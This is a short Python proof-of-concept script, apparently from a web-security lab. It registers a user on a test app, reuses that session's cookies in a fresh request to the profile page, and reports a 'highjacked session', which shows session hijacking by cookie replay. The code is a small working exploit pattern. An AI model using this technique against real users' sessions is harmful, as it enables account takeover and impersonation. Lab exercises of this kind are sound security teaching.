#!/usr/bin/env python3
import requests, sys, re
from bs4 import BeautifulSoup
from interface import *

if len(sys.argv) != 2:
    print(f"Usage: {__file__} server_url")
    sys.exit(-1)

url = sys.argv[1]

victim_session = requests.Session()

reset_app(victim_session, url)

username = 'asdf'
password = 'asdf'
r = register(victim_session, url, username=username, password=password)

# Steal the cookies
cookies = victim_session.cookies

# Log in as the victim in a new session
r = requests.get(f'{url}/profile', cookies=cookies)
soup = BeautifulSoup(r.text, 'html.parser')
victim_username = soup.find(id="usernameInput")['placeholder'] # usernameInput field will have username placeholder
assert victim_username == username

print("[+] Successfully highjacked session")
